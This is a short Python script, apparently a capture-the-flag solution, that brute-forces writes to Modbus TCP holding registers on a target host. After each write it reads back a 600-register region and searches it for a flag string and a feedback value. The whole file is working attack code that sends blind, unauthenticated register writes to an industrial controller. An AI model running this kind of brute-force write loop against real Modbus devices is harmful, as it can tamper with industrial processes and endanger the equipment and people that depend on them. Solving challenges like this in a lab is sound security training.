#!/usr/bin/env python3
"""Brute-force candidate (arm_register, arm_value) pairs. After each write,
scan a region for 'rstcon' and watch reg1337 feedback."""
from modbus import ModbusTCP, ModbusError, HOSTS
import struct, sys

h, p = HOSTS[sys.argv[1] if len(sys.argv) > 1 else "m1"]

def scan_region():
    with ModbusTCP(h, p, timeout=6) as m:
        regs = []
        base = 0
        while base < 600:
            regs.extend(m.read_holding(base, 125)); base += 125
        fb = m.read_holding(1337, 1)[0]
    return regs, fb

def find_flag(regs):
    be = b"".join(struct.pack(">H", r) for r in regs)
    lo = bytes(r & 0xff for r in regs)
    hi = bytes(r >> 8 for r in regs)
    le = b"".join(struct.pack("<H", r) for r in regs)
    for nm, s in [("BE", be), ("LE", le), ("LO", lo), ("HI", hi)]:
        i = s.lower().find(b"rstcon")
        if i >= 0:
            return f"{nm}@{i}: {s[max(0,i-2):i+50]!r}"
        i = s.lower().find(b"flag{")
        if i >= 0:
            return f"{nm}@{i}: {s[max(0,i-2):i+50]!r}"
    return None

regs = [0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 13, 26, 42, 100, 1000, 1336, 1337, 1338, 1965]
vals = [1, 0xFFFF, 0xFF00, 0x41, 7, 42, 1965, 0xCAFE, 0xDEAD, 0x600D, 0x9876,
        2026, 0xBEEF, 0, 0x1337, 0x0BAD]

hits = []
for r in regs:
    for v in vals:
        try:
            with ModbusTCP(h, p, timeout=6) as m:
                m.write_register(r, v)
        except ModbusError as e:
            print(f"  write reg{r}={v:#x} ERR {e}")
            continue
        regs_after, fb = scan_region()
        flag = find_flag(regs_after)
        if flag:
            print(f"*** reg{r}={v:#x} -> FLAG {flag}")
            hits.append((r, v, flag))
        if fb == 0x600D:
            print(f"    reg{r}={v:#x} -> reg1337=GOOD")
print("done. hits:", hits)
